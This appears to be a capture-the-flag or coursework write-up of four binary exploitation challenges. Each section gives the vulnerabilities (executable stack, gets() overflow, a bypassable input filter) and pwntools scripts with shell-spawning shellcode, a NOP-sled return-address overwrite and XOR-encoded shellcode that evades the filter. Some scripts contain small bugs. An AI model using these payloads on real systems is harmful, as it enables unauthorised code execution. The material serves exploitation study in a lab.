RE2
===========================
See reverse engineered C code.

SIMPLE
===========================

General overview of problems faced
-------------------------------------
Kept overwriting / breaking something on the remote environment - so had to wait a long time to be able to test when the system went down again.

List of vulnerabilities
--------------------
- Lack of data execution prevention

Steps to exploit
------------------
Write shellcode, send shellcode :)

Script/Command used
------------------
``` python

def exploit():
    shellcode = asm(
        "mov rdi, 1000\n"            # rdi = 1000 (fd)
        "lea rsi, [rsp]\n"           # rsi = buffer
        "mov rdx, 0x100\n"           # rdx = 256 bytes to read
        "mov rax, 0\n"               # rax = 0 (syscall number for read)
        "syscall\n"                  # invoke read(1000, buffer, 256)

        "mov rdi, 1\n"               # rdi = 1 (stdout)
        "mov rdx, rax\n"             # rdx = number of bytes read
        "mov rax, 1\n"               # rax = 1 (syscall number for write)
        "syscall\n"                  # invoke write(1, buffer, bytes_read)
    )
    return shellcode

    p = process('./simple')

    shellcode = exploit()
    p.sendline(shellcode)
    p.interactive()
```

SHELLZ
===========================

General overview of problems faced
-------------------------------------
Could not find the offset to overwrite return address correctly (or if I did, I'm honestly not sure what is incorrect)

Needed to ensure that the value written to the return address resulted in the
shellcode being run - allowed by nop sled, which takes most of buffer

List of vulnerabilities
--------------------
- Use of gets() allows for buffer overflow
- Stack is executable so if the return address is overwritten to point to the stack, whatever was written in the buffer can be
written

Steps to exploit
------------------
1. Determine offset to return address
2. Write shellcode exploit
3. Construct payload with proper alignment and addresses. Use the random address provided by program to approximate the location of the shellcode.

Script/Command used
------------------
``` python
offset = 8198
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" 

def exploit(p):
    reply = p.recvlines(3)
    ptr = re.search('0x(.{12})', str(reply[2])).group(0)
    address = int(ptr, 16)
    log.info("Random address pointer: %s | %s" % (ptr, p64(address)))

    nop_sled_size = 100
    nop_sled = b'\x90' * nop_sled_size

    padding_size = offset - len(nop_sled) - len(shellcode)
    padding = b'\x90' * padding_size

    payload = nop_sled + shellcode + padding + p64(address)

    p.sendline(payload)
    p.interactive()

p = remote(HOST, PORT)
exploit()
```

WAF
===========================

General overview of problems faced
-------------------------------------
Difficult to identify how to bypass some bad character restrictions without much assistance in this area.

List of vulnerabilities
--------------------
- Lack of data execution prevention - i.e. once more, stack is executable
- Filtering of input data only handles basic cases and can be bypassed through obfuscation
- System allows user to use execve to spawn shell

Steps to exploit
------------------
1. Identify stack pointer
2. XOR /bin/sh string to avoid bad characters being detected by firewall
3. Build and execute shellcode - encoded string can be decoded by xor and execve syscall can be invoked on decoded string passed as first argument
4. Send payload

Script/Command used
------------------
```python
reply = p.recvlines(3)
stack_ptr = re.search('0x(.{12})', str(reply[2])).group(0)
address = int(stack_ptr, 16)
log.info("Buffer address: %s | %s" % (stack_ptr, p64(address)))

# we will decode the encoded bin_sh string using xor
bin_sh = "/bin/sh"
xor_key = 0x20 
encoded_bin_sh = ''.join([chr(ord(c) ^ xor_key) for c in bin_sh]) 
encoded_bin_sh_hex = encoded_bin_sh[::-1].encode('latin-1').hex()
first_chunk = encoded_bin_sh_hex[:16].ljust(16, '0') 
second_chunk = encoded_bin_sh_hex[16:].ljust(16, '0')

shellcode = asm(
    "xor rsi, rsi\n"            
    "xor rdx, rdx\n"   
                
    "xor rax, rax\n"
    f"mov rax, 0x{first_chunk}\n"  
    "push rax\n"
    f"mov rax, 0x{second_chunk}\n"
    "push rax\n"

    "mov rdi, rsp\n"

    f"mov rbx, {hex(xor_key)}\n"
    "mov rax, [rdi]\n"
    "xor rax, rbx\n"
    "mov [rdi], rax\n"
    
    "mov rax, 59\n" 
    "syscall\n"
)

payload = shellcode
p.send(payload)
p.interactive()
```

FIND-ME
===========================

General overview of problems faced
-------------------------------------
Finding offset for big buffer was challenging.

List of vulnerabilities
--------------------
Executes shellcode provided.

Steps to exploit
------------------
1. Find the address of the big buffer by finding its offset from rbp or rsp, the small shellcode can simply call to that address.
2. Big shellcode is identical to simple.

Script/Command used
------------------
``` python

big_shellcode = asm(
    "mov rdi, 1000\n"            # rdi = 1000 (fd)
    "lea rsi, [rsp]\n"           # rsi = buffer
    "mov rdx, 0x100\n"           # rdx = 256 bytes to read
    "mov rax, 0\n"               # rax = 0 (syscall number for read)
    "syscall\n"                  # invoke read(1000, buffer, 256)

    "mov rdi, 1\n"               # rdi = 1 (stdout)
    "mov rdx, rax\n"             # rdx = number of bytes read
    "mov rax, 1\n"               # rax = 1 (syscall number for write)
    "syscall\n"                  # invoke write(1, buffer, bytes_read)
)

small_shellcode = asm(
    "mov rax, [rbp - 0x28]\n"
    "call rax\n" 
)   

if __name__ == '__main__':
    p = remote(HOST, PORT)
    p.sendline(small_shellcode)
    p.sendline(big_shellcode)
    p.interactive()

```

